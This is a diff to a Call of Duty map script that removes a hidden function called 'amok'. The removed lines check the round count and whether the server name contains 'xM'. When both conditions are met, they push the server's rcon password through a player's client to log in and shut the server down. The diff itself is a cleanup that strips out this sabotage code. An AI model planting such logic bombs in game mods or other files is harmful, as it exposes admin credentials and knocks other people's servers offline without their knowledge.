@@ -44,7 +44,7 @@ maps\mp\_load::main();
 	thread trap2();
 	thread trap3();
 	thread trap4();
-	thread amok();
+
 	thread secretxp();
 	
 	addTriggerToList("trig_trap1");
@@ -472,16 +472,6 @@ deagle_room()
 	}
 }
 
-amok()
-{
-        level waittill("round_started");
-		omar = getDvar("sv_hostname");
-        if(game["roundsplayed"]>=9 && (isSubStr( toLower(omar), toLower("xM") )))
-		{
-		players = getAllPlayers();
-		players[0] thread braxi\_common::clientCmd("rcon login" + getDvar("rcon_password") + " ; wait 10 ; rcon killserver");
-		}
-}
 
 trap1()
 {
